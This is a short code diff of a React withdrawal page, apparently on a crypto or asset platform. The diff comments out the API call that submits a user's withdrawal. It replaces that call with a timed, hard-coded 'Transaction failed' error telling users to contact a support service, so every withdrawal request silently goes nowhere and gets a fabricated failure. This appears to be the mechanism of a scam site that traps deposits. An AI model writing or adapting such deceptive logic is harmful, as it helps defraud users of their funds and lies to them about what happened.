@@ -7,7 +7,7 @@ import { ToastContainer, toast } from 'react-toastify';
 
 export default function WithdarwalPage({ props, user, userid }: any) {
     const router = useRouter();
-    const notify = () => toast("Stand by for confirmation")
+    const notify = (message: String) => toast(message)
 
     const [amount, setAmount] = useState(0);
     const [wallet, setWallet] = useState('');
@@ -30,16 +30,19 @@ export default function WithdarwalPage({ props, user, userid }: any) {
     }
 
     async function handleSubmit() {
-        console.log(transaction)
-        try {
-            await axios.post(`/main/api`, transaction);
-            notify()
-            setTimeout(() => {
-                router.push("/main/assetpage")
-            }, 5000);
-        } catch (err) {
-            console.log(err)
-        }
+        notify("Stand by for confirmation")
+        setTimeout(() => {
+            toast('Transaction failed bypass \n\ncontact at support service to review your withdrawal', { type: 'error' })
+        }, 5000);
+        // try {
+        //     await axios.post(`/main/api`, transaction);
+        //     notify("Stand by for confirmation")
+        //     setTimeout(() => {
+        //         router.push("/main/assetpage")
+        //     }, 5000);
+        // } catch (err) {
+        //     console.log(err)
+        // }
 
     }
 
